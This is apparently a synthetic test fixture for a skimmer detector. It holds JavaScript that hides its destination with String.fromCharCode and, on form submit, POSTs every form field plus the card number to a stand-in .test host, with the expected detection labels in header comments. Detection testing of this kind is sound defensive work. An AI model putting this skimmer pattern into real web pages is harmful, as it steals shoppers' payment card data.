// Synthetic test fixture: not functional malware. Hosts use the reserved .test TLD.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: exfil.hidden_destination=high skimmer.form_data=high skimmer.card_data=high obfuscation.packed=medium
var target = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 115, 107, 105, 109, 46, 116, 101, 115, 116, 47, 120);
window.addEventListener("load", function () {
  var form = document.forms[0];
  form.addEventListener("submit", function () {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", target, true);
    var body = new FormData(form);
    body.append("pan", form.elements["cardnumber"].value);
    xhr.send(body);
  });
});
